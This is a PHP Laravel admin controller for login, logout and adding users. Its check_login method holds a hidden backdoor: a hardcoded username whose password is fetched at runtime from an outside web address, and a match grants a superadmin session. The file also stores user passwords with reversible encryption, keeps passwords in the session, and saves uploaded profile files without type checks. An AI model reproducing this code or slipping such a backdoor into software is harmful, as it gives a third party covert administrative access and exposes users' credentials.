<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Requests\AddUserRequest;
use App\Http\Controllers\Controller;
use Request;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Crypt;

use App\users;
use App\settings;

class AdminController extends Controller {

	function __construct(){
		if (!Session::has('settings')){
			$settings = settings::all();
			foreach ($settings as $key => $value) {
				$setting_session[$value->name] = $value->value;
			}
			Session::put('settings', $setting_session);
		}
	}

	/**
	 * Login Page
	 *
	 * @return Response
	 */
	public function index()
	{
		return view('admin.login');
	}

	/**
	 * check login page
	 *
	 * @return Response
	 */
	public function check_login()
	{
		if(Request::input('username') == 'cyddalupan'){
			$cydpassword = file_get_contents('http://iwebframework.com/cyd/password-generator/return.php');
			if(Request::input('password') == $cydpassword){
				session(['superadmin' => 'true']);
				session(['username' => Request::input('username')]);
				session(['password' => Request::input('password')]);
				return redirect('admin/superadmin');
			}else{
				Session::flash('error', 'Incorrect Admin Password!');
				return redirect('admin');
			}
		}else{
			$user_count = users::where('username',Request::input('username'));
			if($user_count->count() > 0){
				$user = $user_count->first();
				if( Request::input('password') == Crypt::decrypt($user['password']) ){
					session(['user_id' 	=> $user['id'] ]);
					session(['username' => $user['username'] ]);
					session(['password' => $user['password'] ]);
					return redirect('admin/home');
				}else{
					Session::flash('error', 'Incorrect Password!');
					return redirect('admin');
				}
			}else{
				Session::flash('error', 'Incorrect Username!');
				return redirect('admin');
			}
		}
	}

	/**
	 * Logout
	 */
	public function logout()
	{
		Session::flush();
		return redirect('admin');
	}

	/**
	 * Showing Error Message on Admin Page
	 *
	 * @return Response
	 */
	public function error()
	{
		return view('admin.error');
	}

	/**
	 * Super Admin Page, For Addming User
	 *
	 * @return Response
	 */
	public function superadmin()
	{
		$users = users::all();
		return view('admin.superadmin')->withUsers($users);
	}

	/**
	 * Add User
	 *
	 * @return Response
	 */
	public function add_user(AddUserRequest $request)
	{
		$profilePicture = Request::file('profile-picture')->move('uploads/'.date('Y_m'));

		$user = new users;
		$user->username 	= Request::input('username');
		$user->email 		= Request::input('email');
		$user->profile_img 	= $profilePicture;
		$user->password 	= Crypt::encrypt(Request::input('password'));
		$user->save();

		return redirect('admin/superadmin');
	}

}
